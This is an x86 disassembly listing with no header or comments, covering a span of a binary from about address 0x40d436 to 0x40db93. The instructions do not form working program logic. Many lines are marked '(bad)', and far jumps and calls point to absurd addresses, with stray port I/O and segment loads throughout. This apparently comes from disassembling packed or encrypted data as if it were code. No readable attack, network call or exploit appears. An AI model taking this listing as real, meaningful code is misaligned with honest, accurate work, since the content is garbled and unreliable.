  40d436:	mov    dh,0xcf
  40d438:	dec    edi
  40d439:	adc    al,0x83
  40d43b:	mov    gs,WORD PTR [edi]
  40d43d:	jp     0x40d3cb
  40d43f:	shl    DWORD PTR [ebx-0x49],1
  40d442:	or     BYTE PTR [ebp+0x609369],al
  40d448:	push   ss
  40d449:	push   edi
  40d44a:	inc    esi
  40d44b:	loopne 0x40d3e7
  40d44d:	and    al,0x7c
  40d44f:	lods   eax,DWORD PTR ds:[esi]
  40d450:	sbb    al,BYTE PTR [esi+ebx*8-0x3d2207af]
  40d457:	mov    ch,bh
  40d459:	jmp    0x571fd723
  40d45e:	cmp    ecx,ecx
  40d460:	inc    eax
  40d461:	xor    esi,esp
  40d463:	sbb    BYTE PTR [edx+0x1959002c],ah
  40d469:	and    ecx,DWORD PTR [ebp+eax*2+0x62]
  40d46d:	ins    DWORD PTR es:[edi],dx
  40d46e:	mov    al,0xb6
  40d470:	rcl    DWORD PTR [ebx+0x267396d3],1
  40d476:	inc    ebp
  40d477:	mov    DWORD PTR ds:0xdc535747,ebx
  40d47d:	add    eax,0x54b08e48
  40d482:	stc    
  40d483:	xchg   ebx,eax
  40d484:	aad    0x69
  40d486:	outs   dx,BYTE PTR ds:[esi]
  40d487:	jmp    0x40e22877
  40d48c:	lahf   
  40d48d:	and    eax,0x8f7c57c1
  40d492:	nop
  40d493:	scas   al,BYTE PTR es:[edi]
  40d494:	mov    al,ds:0xece6d014
  40d499:	jecxz  0x40d44e
  40d49b:	xchg   edx,eax
  40d49c:	mov    ecx,0xb925816a
  40d4a1:	push   cs
  40d4a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4a3:	popa   
  40d4a4:	popf   
  40d4a5:	mov    esi,0xea7696e7
  40d4aa:	mov    dl,0x91
  40d4ac:	sbb    DWORD PTR [ecx-0xe5a8db4],edi
  40d4b2:	mov    dl,0x25
  40d4b4:	mov    ch,0xde
  40d4b6:	or     ecx,DWORD PTR [edi+0x37]
  40d4b9:	pop    ss
  40d4ba:	(bad)  
  40d4bb:	out    0x92,eax
  40d4bd:	mov    ds:0xc3a206ae,al
  40d4c2:	jo     0x40d537
  40d4c4:	scas   al,BYTE PTR es:[edi]
  40d4c5:	retf   
  40d4c6:	loopne 0x40d536
  40d4c8:	aaa    
  40d4c9:	aas    
  40d4ca:	call   0xd796:0xe7eb63db
  40d4d1:	mov    ss,WORD PTR [ecx]
  40d4d3:	push   ebp
  40d4d4:	pop    edi
  40d4d5:	xchg   ebx,eax
  40d4d6:	or     DWORD PTR [eax+0x5d16e759],ebx
  40d4dc:	loopne 0x40d542
  40d4de:	pop    esi
  40d4df:	mov    ebp,0x7ee86757
  40d4e4:	(bad)  
  40d4e5:	jle    0x40d501
  40d4e7:	xchg   edx,eax
  40d4e8:	sbb    eax,0x7da73a4a
  40d4ed:	dec    eax
  40d4ee:	bound  edi,QWORD PTR [edi]
  40d4f0:	jne    0x40d4bd
  40d4f2:	xlat   BYTE PTR ds:[ebx]
  40d4f3:	mov    ecx,0x15ff994b
  40d4f8:	cli    
  40d4f9:	cmp    eax,0x69806dec
  40d4fe:	and    ebx,DWORD PTR [edx+0x35cb59df]
  40d504:	inc    edi
  40d505:	mov    eax,0x825377a7
  40d50a:	cmp    DWORD PTR [ecx+0x4b4596bd],esi
  40d510:	pop    esi
  40d511:	retf   0xbcc7
  40d514:	(bad)  
  40d515:	(bad)  
  40d516:	retf   
  40d517:	push   ebx
  40d518:	pushf  
  40d519:	repnz daa 
  40d51b:	cmp    al,0x8b
  40d51d:	push   eax
  40d51e:	or     eax,0xea424964
  40d523:	ds or  ch,dh
  40d526:	pop    edi
  40d527:	dec    ecx
  40d528:	out    dx,al
  40d529:	add    al,0xe7
  40d52b:	jge    0x40d529
  40d52d:	sti    
  40d52e:	outs   dx,BYTE PTR ds:[esi]
  40d52f:	xchg   ebx,eax
  40d530:	stos   DWORD PTR es:[edi],eax
  40d531:	inc    esi
  40d532:	jmp    0xc55b8ead
  40d537:	mov    ebx,0xbb37da48
  40d53c:	jg     0x40d4e9
  40d53e:	not    BYTE PTR [esi+0x6d]
  40d541:	pop    ds
  40d542:	jmp    0xa39a:0x484efefd
  40d549:	inc    ecx
  40d54a:	xchg   esi,eax
  40d54b:	(bad)  
  40d54d:	in     al,dx
  40d54e:	xchg   ecx,eax
  40d54f:	or     al,0x61
  40d551:	or     edi,ecx
  40d553:	mov    ah,ch
  40d555:	scas   al,BYTE PTR es:[edi]
  40d556:	jmp    0xb50b:0x3847246a
  40d55d:	and    DWORD PTR [esi],ebx
  40d55f:	mov    eax,0x658de6e4
  40d564:	xchg   esi,eax
  40d565:	iret   
  40d566:	pop    edi
  40d567:	dec    edi
  40d568:	cs ret 0x1a74
  40d56c:	out    dx,al
  40d56d:	aaa    
  40d56e:	dec    DWORD PTR [esi]
  40d570:	test   BYTE PTR [ecx-0x12a43ed8],0x4b
  40d577:	mov    ebx,0x72ca9af
  40d57c:	ins    DWORD PTR es:[edi],dx
  40d57d:	mov    esp,0xff95f125
  40d582:	mov    eax,0x84636872
  40d587:	or     al,BYTE PTR [edi-0x2ab45b66]
  40d58d:	ret    0xe4ee
  40d590:	in     eax,dx
  40d591:	ja     0x40d563
  40d593:	loopne 0x40d521
  40d595:	xchg   edx,eax
  40d596:	stos   BYTE PTR es:[edi],al
  40d597:	inc    edi
  40d598:	jmp    0xd65:0x829675ac
  40d59f:	mov    esi,esi
  40d5a1:	bound  ebx,QWORD PTR [esi+0x32]
  40d5a4:	jb     0x40d5ae
  40d5a6:	xlat   BYTE PTR ds:[ebx]
  40d5a7:	or     ecx,DWORD PTR [ebp+0x33]
  40d5aa:	popf   
  40d5ab:	sub    ebx,DWORD PTR [ecx+0x60a49c51]
  40d5b1:	jg     0x40d5a6
  40d5b3:	(bad)  
  40d5b4:	jp     0x40d5bb
  40d5b6:	pop    eax
  40d5b7:	mov    bh,0x17
  40d5b9:	retf   0x5b8d
  40d5bc:	idiv   DWORD PTR [edx]
  40d5be:	out    dx,eax
  40d5bf:	call   0x924c:0xf10a0ed
  40d5c6:	xlat   BYTE PTR ds:[ebx]
  40d5c7:	call   0x4fa6:0x86a1466a
  40d5ce:	mov    esi,0x45d9a208
  40d5d3:	loope  0x40d5fe
  40d5d5:	enter  0xb63c,0xc8
  40d5d9:	and    DWORD PTR [edi],edi
  40d5db:	mov    eax,ds:0x869caefb
  40d5e0:	push   ebx
  40d5e1:	pop    ss
  40d5e2:	ss jbe 0x40d5b5
  40d5e5:	rcl    DWORD PTR [ebx-0x3c21b7f6],cl
  40d5eb:	jge    0x40d5a8
  40d5ed:	(bad)
  40d5f0:	rcl    ebp,cl
  40d5f2:	pop    eax
  40d5f3:	pop    ebp
  40d5f4:	mov    esi,0x1fadcde6
  40d5f9:	adc    dh,bl
  40d5fb:	fnstsw WORD PTR [esi+0x42ccd44c]
  40d601:	leave  
  40d602:	sub    BYTE PTR [ebx],0x10
  40d605:	mov    ds:0xae018ffd,al
  40d60a:	inc    BYTE PTR [ebp+0x6]
  40d60d:	lahf   
  40d60e:	push   eax
  40d60f:	ss sahf 
  40d611:	pop    edi
  40d612:	stos   DWORD PTR es:[edi],eax
  40d613:	mov    ch,0x60
  40d615:	cmp    al,0xae
  40d618:	pop    edx
  40d619:	add    bl,BYTE PTR [ebp-0x28]
  40d61c:	dec    edx
  40d61d:	mov    al,0x86
  40d61f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d620:	push   ss
  40d621:	pushf  
  40d622:	rcl    DWORD PTR [eax+0x6a],1
  40d625:	dec    esi
  40d626:	push   esi
  40d627:	pop    ss
  40d628:	and    ah,BYTE PTR [esi-0x3c]
  40d62b:	mov    eax,ds:0x34cff4d3
  40d630:	inc    eax
  40d631:	out    0x80,al
  40d633:	cmp    DWORD PTR [eax+esi*4+0x43],ecx
  40d637:	cmp    al,0xf9
  40d639:	loope  0x40d5f0
  40d63b:	dec    edx
  40d63c:	jne    0x40d644
  40d63e:	dec    ecx
  40d63f:	pop    esi
  40d640:	sub    al,0x7d
  40d642:	stos   BYTE PTR es:[edi],al
  40d643:	(bad)  [ebp+0x41]
  40d646:	inc    esp
  40d647:	stos   BYTE PTR es:[edi],al
  40d648:	les    ebp,FWORD PTR [ecx+0x41]
  40d64b:	pop    es
  40d64c:	pop    esp
  40d64d:	mov    ah,0xef
  40d64f:	adc    eax,0x378e9e1c
  40d654:	lods   eax,DWORD PTR ds:[esi]
  40d655:	mov    dh,0x56
  40d657:	and    ebx,DWORD PTR [edx+0x3b]
  40d65a:	push   ds
  40d65b:	aam    0x45
  40d65d:	add    DWORD PTR [edi-0x5d1ce343],esp
  40d663:	xor    al,0xaa
  40d665:	push   0xc
  40d667:	inc    ebx
  40d668:	inc    edx
  40d669:	jg     0x40d63d
  40d66b:	dec    eax
  40d66c:	push   ecx
  40d66d:	cmc    
  40d66e:	xchg   edx,eax
  40d66f:	cmp    eax,0x74e06eaf
  40d674:	shl    ah,cl
  40d676:	les    ebx,FWORD PTR [eax+eiz*1]
  40d679:	cmp    eax,0xa0d97850
  40d67e:	shl    DWORD PTR cs:[edi],cl
  40d681:	rcl    bh,1
  40d683:	(bad)  
  40d684:	jo     0x40d610
  40d686:	push   cs
  40d687:	sbb    edx,edi
  40d689:	int    0x69
  40d68b:	jns    0x40d6d2
  40d68d:	push   eax
  40d68e:	ror    BYTE PTR [edx],cl
  40d690:	hlt    
  40d691:	dec    esi
  40d692:	add    al,0x86
  40d694:	pop    es
  40d695:	push   ds
  40d696:	add    DWORD PTR [edx+0x5610d0dc],eax
  40d69c:	xor    al,BYTE PTR [edi]
  40d69e:	push   0x6ff39d79
  40d6a3:	rol    DWORD PTR [esi+0x2b],0xc5
  40d6a7:	(bad)  
  40d6a8:	into   
  40d6a9:	sti    
  40d6aa:	adc    DWORD PTR [ebp+edi*4+0x50094ea7],edx
  40d6b1:	push   edi
  40d6b2:	and    BYTE PTR [edx-0x71],ch
  40d6b5:	cmp    eax,0xfdebe2e1
  40d6ba:	ror    edi,1
  40d6bc:	repz in eax,dx
  40d6be:	cmc    
  40d6bf:	xchg   ecx,eax
  40d6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6c1:	int3   
  40d6c2:	mov    bl,0xec
  40d6c4:	(bad)  
  40d6c6:	retf   
  40d6c7:	outs   dx,BYTE PTR ds:[esi]
  40d6c8:	arpl   bx,bp
  40d6ca:	rol    DWORD PTR [eax-0x78102a2],cl
  40d6d0:	ja     0x40d6aa
  40d6d2:	nop
  40d6d3:	inc    eax
  40d6d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6d5:	jecxz  0x40d6d5
  40d6d7:	ins    BYTE PTR es:[edi],dx
  40d6d8:	pop    ebp
  40d6d9:	mov    ecx,cs
  40d6db:	aam    0xc3
  40d6dd:	(bad)  
  40d6de:	(bad)  
  40d6df:	cmp    DWORD PTR [ecx],ebx
  40d6e1:	(bad)  
  40d6e2:	cdq    
  40d6e3:	lods   al,BYTE PTR ds:[esi]
  40d6e4:	and    cl,BYTE PTR [edi]
  40d6e6:	mov    esp,DWORD PTR [edx+edx*2-0x40]
  40d6ea:	pop    ss
  40d6eb:	jo     0x40d767
  40d6ed:	cwde   
  40d6ee:	jbe    0x40d70b
  40d6f0:	or     DWORD PTR [ecx],edi
  40d6f2:	xchg   edx,eax
  40d6f3:	mov    DWORD PTR [eax+0x38e94214],edi
  40d6f9:	dec    ebp
  40d6fa:	nop
  40d6fb:	pop    esp
  40d6fc:	and    al,0xe
  40d6fe:	jb     0x40d6c2
  40d700:	xor    al,0x81
  40d702:	jmp    0x523e1273
  40d707:	inc    ebx
  40d708:	int3   
  40d709:	and    al,0x6e
  40d70b:	clc    
  40d70c:	push   ebp
  40d70d:	or     al,0xf1
  40d70f:	push   ebx
  40d710:	xor    ch,ah
  40d712:	mov    DWORD PTR [ebx-0x46199d23],esp
  40d718:	mov    bl,0x49
  40d71a:	bound  ebp,QWORD PTR [esi+0x2ae03515]
  40d720:	lods   al,BYTE PTR ds:[esi]
  40d721:	dec    eax
  40d722:	hlt    
  40d723:	out    0x72,eax
  40d725:	or     BYTE PTR [eax+0x5e],ah
  40d728:	addr16 dec ax
  40d72b:	gs and eax,0x966fcc99
  40d731:	pop    ebp
  40d732:	adc    DWORD PTR [ecx+0x2d9aebf9],ecx
  40d738:	shr    BYTE PTR [ebx+0x66],1
  40d73b:	and    DWORD PTR [ecx],esi
  40d73d:	neg    BYTE PTR [eax-0x4070400]
  40d743:	cmp    al,0x41
  40d745:	sub    eax,0x737499c2
  40d74a:	shr    DWORD PTR gs:[ecx],1
  40d74d:	and    ah,ch
  40d74f:	call   0x1354:0x8990c7a3
  40d756:	xchg   DWORD PTR [ecx-0x70082596],eax
  40d75c:	test   al,0x4f
  40d75e:	mov    dl,0x1e
  40d760:	sar    BYTE PTR [ebx],0x2d
  40d763:	xchg   ebx,eax
  40d764:	test   eax,0xf0c6235
  40d769:	xlat   BYTE PTR ds:[ebx]
  40d76a:	(bad)  
  40d76b:	xchg   ebp,eax
  40d76c:	sar    BYTE PTR [eax+0x17],cl
  40d76f:	hlt    
  40d770:	ficomp WORD PTR [edi-0x15]
  40d773:	dec    edi
  40d774:	and    al,0x31
  40d776:	ret    0x2864
  40d779:	lds    eax,FWORD PTR [ecx]
  40d77b:	push   cs
  40d77c:	cmp    BYTE PTR [ecx+0xc76d9],dh
  40d782:	sbb    BYTE PTR [edi+ecx*2],ch
  40d785:	and    ecx,DWORD PTR [esi+0x69]
  40d788:	cmp    al,0x16
  40d78a:	(bad)  
  40d78b:	xchg   ebp,eax
  40d78c:	test   al,0x5c
  40d78e:	add    al,BYTE PTR [ecx+0x6531e102]
  40d794:	clc    
  40d795:	test   al,0x6
  40d797:	inc    ecx
  40d798:	hlt    
  40d799:	(bad)  [ebx-0x1d0aa4a5]
  40d79f:	push   cs
  40d7a0:	add    esi,ebp
  40d7a2:	aas    
  40d7a3:	dec    edi
  40d7a4:	lods   al,BYTE PTR ds:[esi]
  40d7a5:	pop    ss
  40d7a6:	cmp    eax,0xb888473b
  40d7ab:	data16 int3 
  40d7ad:	jns    0x40d75e
  40d7af:	(bad)  
  40d7b0:	xchg   ecx,eax
  40d7b1:	div    ebx
  40d7b3:	push   ecx
  40d7b4:	add    BYTE PTR [esi],cl
  40d7b6:	inc    edi
  40d7b7:	(bad)  
  40d7b9:	sbb    dh,BYTE PTR [eax+ebp*4-0x79]
  40d7bd:	out    0xeb,al
  40d7bf:	pop    ss
  40d7c0:	mov    ?,WORD PTR [edi]
  40d7c2:	fnsave [esi-0x1d]
  40d7c5:	mov    ch,0x8b
  40d7c7:	fstp   QWORD PTR [edx+ebp*1+0x6b]
  40d7cb:	mov    ah,0x8e
  40d7cd:	mov    al,al
  40d7cf:	mov    ch,0x80
  40d7d1:	jp     0x40d79b
  40d7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7d4:	jmp    0x871fd7bd
  40d7d9:	or     eax,0x226b294a
  40d7de:	mov    dh,0xa2
  40d7e0:	pop    ebp
  40d7e1:	loop   0x40d7a3
  40d7e3:	xor    eax,0x1f12df82
  40d7e8:	neg    BYTE PTR [ebp-0x3adaec42]
  40d7ee:	cli    
  40d7ef:	add    ecx,DWORD PTR [eax-0x15]
  40d7f2:	jnp    0x40d792
  40d7f4:	std    
  40d7f5:	or     ebp,ebp
  40d7f7:	ja     0x40d802
  40d7f9:	inc    eax
  40d7fa:	fwait
  40d7fb:	jg     0x40d83c
  40d7fd:	mov    cl,0xe8
  40d7ff:	sub    eax,0x7def0851
  40d804:	and    al,0xbe
  40d806:	and    DWORD PTR [ecx+ecx*1-0x3],eax
  40d80a:	sar    BYTE PTR [edx],cl
  40d80c:	cld    
  40d80d:	sub    al,0xe2
  40d80f:	mov    esi,ebp
  40d811:	xor    DWORD PTR [ebp-0x64de3600],ebp
  40d817:	xchg   ebx,eax
  40d818:	pop    ss
  40d819:	push   edx
  40d81a:	pop    esp
  40d81b:	call   0x859dff7
  40d820:	mov    bl,0x32
  40d822:	mov    bl,0x9
  40d824:	mov    ds:0xd10d0ab8,al
  40d829:	sbb    eax,0xaf6cda91
  40d82e:	lahf   
  40d82f:	out    dx,eax
  40d830:	xchg   DWORD PTR ds:0x6d5583ca,esi
  40d836:	push   esp
  40d837:	mov    ebx,esi
  40d839:	sub    al,0xb3
  40d83b:	push   edi
  40d83c:	push   ebx
  40d83d:	lea    esi,[ecx]
  40d83f:	or     eax,0xab355ab8
  40d844:	jo     0x40d86d
  40d846:	dec    eax
  40d847:	cli    
  40d848:	retf   
  40d849:	or     ah,dh
  40d84b:	jno    0x40d896
  40d84d:	push   ebx
  40d84e:	aam    0x96
  40d850:	jnp    0x40d888
  40d852:	mov    edi,0xa607fa47
  40d857:	inc    esp
  40d858:	sbb    eax,0x1b3ca5c9
  40d85d:	cmp    ah,BYTE PTR [esi]
  40d85f:	inc    edi
  40d860:	inc    esp
  40d861:	add    al,BYTE PTR [ecx+0x60]
  40d864:	mov    WORD PTR [esp+esi*2-0x20],ss
  40d868:	mov    DWORD PTR [edx+0x5a28d4d0],esi
  40d86e:	jae    0x40d88a
  40d870:	fsubr  st(0),st
  40d872:	pop    edx
  40d873:	enter  0xd318,0x5f
  40d877:	pop    ecx
  40d878:	sbb    BYTE PTR [ebx+0x62eb75e3],dl
  40d87e:	int3   
  40d87f:	std    
  40d880:	mov    al,al
  40d882:	push   ebx
  40d883:	imul   ecx,DWORD PTR [edi+0x7ac4728f],0x72181a5d
  40d88d:	and    bl,0xd0
  40d890:	jg     0x40d8ee
  40d892:	mov    DWORD PTR [eax],edx
  40d894:	push   edx
  40d895:	stos   DWORD PTR es:[edi],eax
  40d896:	or     ecx,ecx
  40d898:	fidiv  DWORD PTR [ecx]
  40d89a:	retf   0x4c17
  40d89d:	cmp    DWORD PTR ds:0xd067f8e0,0x53
  40d8a4:	adc    BYTE PTR [ebx],bl
  40d8a6:	int    0xb
  40d8a8:	mov    ah,0x0
  40d8aa:	cmp    eax,DWORD PTR [eax+ecx*4+0x3c]
  40d8ae:	mov    ebx,0x63d6bb7a
  40d8b3:	icebp  
  40d8b4:	iret   
  40d8b5:	cs xchg edx,eax
  40d8b7:	out    dx,al
  40d8b8:	xor    BYTE PTR [edx-0x31],ah
  40d8bb:	jnp    0x40d8e6
  40d8bd:	xlat   BYTE PTR ds:[ebx]
  40d8be:	daa    
  40d8bf:	out    dx,al
  40d8c0:	sbb    esi,DWORD PTR [eax]
  40d8c2:	add    ecx,DWORD PTR [edx+0x13]
  40d8c5:	pop    ds
  40d8c6:	jge    0x40d8ba
  40d8c8:	pop    ds
  40d8c9:	arpl   WORD PTR [ebx+0x2b],di
  40d8cc:	and    al,BYTE PTR [edx-0x67]
  40d8cf:	popa   
  40d8d0:	inc    ecx
  40d8d1:	mov    bh,0x84
  40d8d3:	sbb    bh,BYTE PTR [edx-0x49]
  40d8d6:	lds    eax,FWORD PTR [ebp+0x14]
  40d8d9:	scas   eax,DWORD PTR es:[edi]
  40d8da:	in     al,0x5e
  40d8dc:	fucomip st,st(4)
  40d8de:	push   esi
  40d8df:	das    
  40d8e0:	and    cl,BYTE PTR [ecx]
  40d8e2:	(bad)  
  40d8e3:	pop    ecx
  40d8e4:	add    al,0xed
  40d8e6:	mov    esi,0xa9b2721b
  40d8eb:	lods   al,BYTE PTR ds:[esi]
  40d8ec:	daa    
  40d8ed:	jmp    FWORD PTR [ebx]
  40d8ef:	adc    DWORD PTR [ebp+0x31],ebx
  40d8f2:	out    0xa2,al
  40d8f4:	mov    eax,ds:0xd21f6f63
  40d8f9:	mov    cs,WORD PTR [ebp+0x3b]
  40d8fc:	repz xor DWORD PTR ds:0xa310ece8,edx
  40d903:	retf   
  40d904:	lea    ecx,[edi]
  40d906:	lods   al,BYTE PTR ds:[esi]
  40d907:	push   0x63
  40d909:	sbb    eax,0xf1c08918
  40d90e:	push   ebp
  40d90f:	jmp    0xab06:0x2609e9e5
  40d916:	xor    esp,DWORD PTR ds:0xddb6509c
  40d91c:	div    DWORD PTR [edx-0xf]
  40d91f:	or     dl,BYTE PTR [edx+0x3416e3d4]
  40d925:	lea    ecx,[edx-0x4e60acec]
  40d92b:	xor    eax,0x315f40b
  40d930:	rol    DWORD PTR [ecx+0x1bf2be94],cl
  40d936:	mov    ch,0xb
  40d938:	fsubr  DWORD PTR [ebp-0x44]
  40d93b:	fidiv  WORD PTR [edi]
  40d93d:	pop    ss
  40d93e:	mov    edx,0x1b5fef54
  40d943:	sub    al,0xea
  40d945:	mov    al,0x47
  40d947:	retf   
  40d948:	pusha  
  40d949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d94a:	hlt    
  40d94b:	jp     0x40d958
  40d94d:	add    eax,DWORD PTR [esi-0x7e59c4ae]
  40d953:	or     al,0x70
  40d955:	add    ebx,DWORD PTR [ebx+0x32]
  40d958:	jmp    0x8680f963
  40d95d:	push   ecx
  40d95e:	iret   
  40d95f:	xchg   ecx,eax
  40d960:	pop    ecx
  40d961:	scas   al,BYTE PTR es:[edi]
  40d962:	fstp   QWORD PTR [ebx]
  40d964:	int    0x2d
  40d966:	mov    es,esp
  40d968:	fimul  DWORD PTR [ebx+edi*2-0xf]
  40d96c:	xchg   edx,eax
  40d96d:	jns    0x40d99f
  40d96f:	out    dx,eax
  40d970:	sbb    edx,DWORD PTR [edi+0xed94025]
  40d976:	adc    al,0xe3
  40d978:	shl    dl,cl
  40d97a:	mov    ?,esp
  40d97c:	sub    al,BYTE PTR [ebx]
  40d97e:	jne    0x40d9a5
  40d980:	les    esi,FWORD PTR [edx+0x1c]
  40d983:	push   edi
  40d984:	mov    al,0x84
  40d986:	arpl   WORD PTR [edi],sp
  40d988:	sub    al,0x87
  40d98a:	mov    ch,0xb9
  40d98c:	sbb    esp,esi
  40d98e:	test   eax,0x6a8f298e
  40d993:	jae    0x40d91d
  40d995:	jl     0x40d96d
  40d997:	xor    BYTE PTR [ebp+0x7b],cl
  40d99a:	call   0x4208:0xd03367ab
  40d9a1:	mov    esi,0xb3f64546
  40d9a6:	test   DWORD PTR [ebx+0x76594db],esi
  40d9ac:	pop    esp
  40d9ad:	cwde   
  40d9ae:	ficom  WORD PTR [edx-0xe]
  40d9b1:	xor    eax,0x5932a2e1
  40d9b6:	ins    DWORD PTR es:[edi],dx
  40d9b7:	sbb    BYTE PTR [esi],bl
  40d9b9:	pusha  
  40d9ba:	sbb    eax,DWORD PTR [ebp-0x7a869425]
  40d9c0:	aas    
  40d9c1:	adc    BYTE PTR [eax-0x6a],dl
  40d9c4:	arpl   WORD PTR [esi-0x52ad356b],bp
  40d9ca:	xchg   esi,eax
  40d9cb:	hlt    
  40d9cc:	daa    
  40d9cd:	lods   al,BYTE PTR ds:[esi]
  40d9ce:	pop    edx
  40d9cf:	scas   al,BYTE PTR es:[edi]
  40d9d0:	fldcw  WORD PTR ds:0x4cc655d1
  40d9d6:	and    DWORD PTR [ebp-0x4d],ebp
  40d9d9:	in     al,0xad
  40d9db:	int3   
  40d9dc:	pop    esi
  40d9dd:	push   eax
  40d9de:	daa    
  40d9df:	adc    BYTE PTR [ebx],dl
  40d9e1:	mov    dl,0x44
  40d9e3:	icebp  
  40d9e4:	xchg   ecx,eax
  40d9e5:	imul   edx,DWORD PTR [esi-0x7f],0xe91708e2
  40d9ec:	mov    esp,0xcf4c8fef
  40d9f1:	cmp    esi,ebp
  40d9f3:	add    BYTE PTR [eax],dl
  40d9f5:	or     eax,0x83cd900c
  40d9fa:	pop    ebx
  40d9fb:	inc    edi
  40d9fc:	mov    edi,0xea5aa184
  40da01:	add    BYTE PTR [edi-0x30a23d3],0x1e
  40da08:	sti    
  40da09:	mov    ?,WORD PTR [ebp+0x1305027b]
  40da0f:	and    DWORD PTR [edx+0x254679db],esp
  40da15:	and    DWORD PTR [ebx+0x70],0x4201eb19
  40da1c:	mov    ebx,0xff7702f
  40da21:	test   al,0x24
  40da23:	fstp   QWORD PTR [ebx+edx*4]
  40da26:	add    eax,DWORD PTR [eax]
  40da28:	jo     0x40da1b
  40da2a:	or     BYTE PTR [esi+eiz*1],bh
  40da2d:	mov    cl,0xf1
  40da2f:	push   edi
  40da30:	std    
  40da31:	arpl   WORD PTR [esp+edi*4+0x45c26e3a],ax
  40da38:	jl     0x40da83
  40da3a:	mov    edi,0x73818c68
  40da3f:	das    
  40da40:	and    DWORD PTR ds:0x6f7bf365,0xfffffff0
  40da47:	add    BYTE PTR [ebx+0x2e8c4ae7],bh
  40da4d:	xchg   ebx,eax
  40da4e:	out    0xf7,al
  40da50:	jle    0x40daac
  40da52:	pop    ecx
  40da53:	inc    ecx
  40da54:	lods   eax,DWORD PTR ds:[esi]
  40da55:	adc    dl,BYTE PTR [eax]
  40da57:	add    BYTE PTR [edx+esi*4-0x614f717f],0x72
  40da5f:	scas   eax,DWORD PTR es:[edi]
  40da60:	sbb    bh,BYTE PTR [esi-0x72d77542]
  40da66:	inc    ecx
  40da67:	outs   dx,DWORD PTR gs:[esi]
  40da69:	push   ds
  40da6a:	push   esp
  40da6b:	fist   DWORD PTR [edx-0x4b276c3f]
  40da71:	pop    ebp
  40da72:	pop    eax
  40da73:	mov    al,BYTE PTR ds:0xfae7219d
  40da79:	ja     0x40da52
  40da7b:	rcr    DWORD PTR [esi-0x29271eb],0x54
  40da82:	jp     0x40daa7
  40da84:	in     eax,dx
  40da85:	leave  
  40da86:	xchg   edx,eax
  40da87:	pushf  
  40da88:	sbb    al,0x78
  40da8a:	(bad)  
  40da8b:	ja     0x40da19
  40da8d:	xchg   edi,eax
  40da8e:	pop    ebp
  40da8f:	loope  0x40dab5
  40da91:	mov    DWORD PTR [ecx-0x69],0xf1269537
  40da98:	ins    BYTE PTR es:[edi],dx
  40da99:	pop    ebp
  40da9a:	sahf   
  40da9b:	les    edi,FWORD PTR [eax+0x4f6b036a]
  40daa1:	frstor [eax-0x23]
  40daa4:	and    cl,BYTE PTR [ecx]
  40daa6:	mov    esp,0xe50361df
  40daab:	gs jecxz 0x40da80
  40daae:	and    ebx,DWORD PTR [ebp+0x59395dbc]
  40dab4:	cmp    DWORD PTR [edx],esi
  40dab6:	rcr    al,0x39
  40dab9:	jge    0x40dab9
  40dabb:	add    DWORD PTR [eax-0x76e3a62c],ecx
  40dac1:	retf   
  40dac2:	xchg   BYTE PTR [ebp+ecx*8+0x42],cl
  40dac6:	add    BYTE PTR [ecx],0xf6
  40dac9:	test   al,0xb8
  40dacb:	aam    0xeb
  40dacd:	pop    edi
  40dace:	scas   al,BYTE PTR es:[edi]
  40dacf:	inc    esi
  40dad0:	mov    ecx,0xd8b43246
  40dad5:	sub    DWORD PTR ds:0x6c5fe3d4,esi
  40dadb:	xchg   esp,eax
  40dadc:	ds leave 
  40dade:	push   esi
  40dadf:	(bad)  
  40dae0:	jp     0x40dae6
  40dae2:	fild   DWORD PTR [edi+eiz*2-0x74]
  40dae6:	jmp    0x40da6e
  40dae8:	popf   
  40dae9:	lods   al,BYTE PTR ds:[esi]
  40daea:	test   BYTE PTR [ebx],al
  40daec:	dec    ebp
  40daed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daee:	and    DWORD PTR ds:0xc889c828,0xffffff8b
  40daf5:	dec    esp
  40daf6:	cmp    BYTE PTR [edx],ch
  40daf8:	js     0x40dada
  40dafa:	scas   eax,DWORD PTR es:[edi]
  40dafb:	ss in  eax,0x8a
  40dafe:	mov    bl,0xa9
  40db00:	mov    dh,0xf3
  40db02:	sar    BYTE PTR [eax],cl
  40db04:	lock sbb al,0xd2
  40db07:	inc    esi
  40db08:	or     eax,0x6465ac12
  40db0d:	js     0x40db34
  40db0f:	cmp    al,0x6d
  40db11:	(bad)  
  40db12:	jns    0x40db42
  40db14:	adc    ecx,DWORD PTR [ebx]
  40db16:	test   BYTE PTR [esi-0x5b565986],al
  40db1c:	bound  esi,QWORD PTR [edi+0x4aa1e1bb]
  40db22:	(bad)  
  40db23:	jbe    0x40daee
  40db25:	ja     0x40dafd
  40db27:	cmp    DWORD PTR [eax-0x32],edi
  40db2a:	mov    bl,ch
  40db2c:	test   DWORD PTR [edi-0x1d8db722],esp
  40db32:	xor    esp,0xeb2febc3
  40db38:	xchg   BYTE PTR [eax+eax*8-0x4e61bf96],al
  40db3f:	stos   BYTE PTR es:[edi],al
  40db40:	sbb    ebx,0x6d
  40db43:	fild   QWORD PTR [esi+edi*4+0xc]
  40db47:	in     eax,0x83
  40db49:	js     0x40dba5
  40db4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db4c:	fcom   QWORD PTR [eax-0x4051976a]
  40db52:	push   edi
  40db53:	push   es
  40db54:	mov    eax,ds:0x4762d23a
  40db59:	imul   ecx,eax,0x42
  40db5c:	mov    BYTE PTR [edi-0xa51e1de],al
  40db62:	cdq    
  40db63:	mov    ebp,0x532a0fd0
  40db68:	mov    ah,0xb3
  40db6a:	jne    0x40db30
  40db6c:	int    0x86
  40db6e:	and    al,0xca
  40db70:	dec    BYTE PTR [edi]
  40db72:	jae    0x40db3f
  40db74:	nop
  40db75:	ror    DWORD PTR [esi],cl
  40db77:	repnz retf 
  40db79:	imul   esi,DWORD PTR [ecx],0x244b5ddd
  40db7f:	(bad)  
  40db80:	icebp  
  40db81:	clc    
  40db82:	inc    ecx
  40db83:	mov    eax,ds:0x36786b95
  40db88:	and    bl,BYTE PTR [eax-0x7d]
  40db8b:	aam    0x51
  40db8d:	ret    
  40db8e:	out    dx,al
  40db8f:	lds    eax,FWORD PTR [eax-0x18]
  40db92:	dec    esp
  40db93:	or     esp,esp
